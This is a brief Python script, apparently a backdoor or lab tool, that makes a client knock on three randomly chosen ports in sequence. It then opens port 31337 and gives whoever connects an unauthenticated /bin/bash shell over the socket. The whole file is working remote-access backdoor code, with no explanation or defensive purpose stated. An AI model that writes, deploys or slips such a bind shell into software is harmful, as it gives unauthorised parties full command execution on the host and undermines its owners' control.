#!/usr/bin/python3

from random import randint
import socket 
import subprocess
import os

MIN_PORT = 1200
MAX_PORT = 2500
SHELL_PORT = 31337
BACKLOG = 10


def wait_for_port_knock(port, message):
    s = socket.socket()
    s.bind(("", port))
    s.listen(BACKLOG)
    conn, addr = s.accept()
    conn.send(message.encode("utf-8"))
    s.close()


def give_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", port))
    s.listen(BACKLOG)
    (rem, addr) = s.accept()
    child = subprocess.Popen(["/bin/bash"], stdout=rem.fileno(),
                            stderr=rem.fileno(), stdin=rem.fileno())


if __name__ == "__main__":
    # start listening sockets on random ports to wait for
    # a port knock
    rand_ports = [randint(MIN_PORT, MAX_PORT) for i in range(3)]
    rand_ports.append(SHELL_PORT)

    print(rand_ports)
    for port, next_port in zip(rand_ports, rand_ports[1:]):
        # wait for a connection on port, and respond with
        # next_port
        wait_for_port_knock(port, str(next_port))

    # the user has knocked on every port, so give them a shell
    give_shell(SHELL_PORT)
